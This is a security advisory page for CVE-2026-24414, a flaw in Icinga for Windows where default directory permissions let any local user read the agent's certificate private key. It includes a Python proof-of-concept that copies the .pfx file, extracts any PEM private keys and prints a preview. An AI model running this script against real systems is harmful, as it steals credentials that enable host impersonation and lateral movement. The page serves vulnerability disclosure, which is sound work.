---
title: Icinga for Windows 1.13.3 - Incorrect Default Permissions Private Key Exposure
url: https://cxsecurity.com/issue/WLB-2026020024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-23
fetch_date: 2026-02-24T04:11:33.002962
---

# Icinga for Windows 1.13.3 - Incorrect Default Permissions Private Key Exposure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Icinga for Windows 1.13.3 - Incorrect Default Permissions Private Key Exposure** **2026.02.23**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: ****Yes****  Remote: **No**  CVE:  **[CVE-2026-24414](https://cxsecurity.com/cveshow/%20CVE-2026-24414/ "Click to see  CVE-2026-24414")**  CWE: **N/A** | |

# Exploit Title: Icinga for Windows 1.13.3 - Incorrect Default Permissions Private Key Exposure
# Date: 2026-02-23
# Exploit Author: nu11secur1ty
# Vendor Homepage: https://icinga.com/
# Software Link: https://github.com/Icinga/icinga-powershell-framework/releases/tag/v1.13.3
# Version: Icinga PowerShell Framework < 1.13.4, < 1.12.4, < 1.11.2
# Tested on: Windows 11 25H2
# CVE: CVE-2026-24414
## Description
Icinga for Windows PowerShell Framework versions prior to 1.13.4, 1.12.4, and 1.11.2 install the certificate directory with insecure default permissions. The directory `C:\Program Files\WindowsPowerShell\Modules\icinga-powershell-framework\certificate` is created with `BUILTIN\Users:(RX)` permissions, allowing ANY local user to read the `icingaforwindows.pfx` certificate file containing the private key.
This vulnerability leads to complete exposure of the Icinga private key, enabling attackers to:
- Impersonate the monitored host
- Decrypt Icinga monitoring traffic
- Use the certificate for authentication to other systems
- Perform lateral movement within the network
## Proof of Concept
The following Python exploit demonstrates that any standard user can read and extract the private key:
```python
#!/usr/bin/env python3
"""
CVE-2026-24414 - Icinga for Windows Private Key Exposure
Exploit Author: nu11secur1ty
Tested on: Windows 11 25H2
"""
import os
import re
import shutil
import getpass
from pathlib import Path
from datetime import datetime
# Target path
cert\_file = Path(r"C:\Program Files\WindowsPowerShell\Modules\icinga-powershell-framework\certificate\icingaforwindows.pfx")
def main():
print("[\*] CVE-2026-24414 Exploit - Icinga Private Key Exposure")
print(f"[\*] Running as: {getpass.getuser()}")
print("-" \* 60)
# Check if target exists
if not cert\_file.exists():
print("[-] Target certificate not found")
return
print(f"[+] Found certificate: {cert\_file}")
print(f"[+] File size: {cert\_file.stat().st\_size} bytes")
# Check permissions (visual confirmation)
os.system(f'icacls "{cert\_file.parent}"')
# Create output directory
output\_dir = Path.cwd() / f"icinga\_exposed\_{datetime.now().strftime('%Y%m%d\_%H%M%S')}"
output\_dir.mkdir(exist\_ok=True)
# Copy certificate
shutil.copy2(cert\_file, output\_dir / "original\_certificate.pfx")
print(f"[+] Certificate copied to: {output\_dir / 'original\_certificate.pfx'}")
# Try to extract private key
with open(cert\_file, 'rb') as f:
data = f.read()
# Look for PEM private key
try:
text\_data = data.decode('utf-8', errors='ignore')
pattern = r'-----BEGIN.\*PRIVATE KEY-----.\*?-----END.\*PRIVATE KEY-----'
keys = re.findall(pattern, text\_data, re.DOTALL)
if keys:
for i, key in enumerate(keys, 1):
key\_file = output\_dir / f"private\_key\_{i}.key"
with open(key\_file, 'w') as kf:
kf.write(key)
print(f"[+] Private key extracted: {key\_file}")
print(f"[+] Key preview:\n{key[:200]}...")
else:
print("[!] No PEM key found - certificate may be binary")
print(f"[+] Raw certificate saved for analysis")
except:
print("[!] Binary certificate saved - may contain private key in DER format")
print("\n" + "="\*60)
print("[!] VULNERABILITY CONFIRMED!")
print("[!] ANY local user can read this private key")
print("[!] CVE-2026-24414 - Incorrect Default Permissions")
print("="\*60)
# Show dangerous permissions
print("\n[!] CRITICAL: Check the permissions above")
print("[!] Look for: BUILTIN\\Users:(I)(RX) - THIS IS THE VULNERABILITY")
# Create proof file
proof = output\_dir / "PROOF.txt"
with open(proof, 'w') as f:
f.write(f"CVE-2026-24414 Exploit Success\n")
f.write(f"Date: {datetime.now()}\n")
f.write(f"User: {getpass.getuser()}\n")
f.write(f"Certificate: {cert\_file}\n")
f.write("Private Key: EXTRACTED\n")
f.write("Impact: ANY local user can steal this key\n")
print(f"\n[+] Proof file created: {proof}")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020024)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top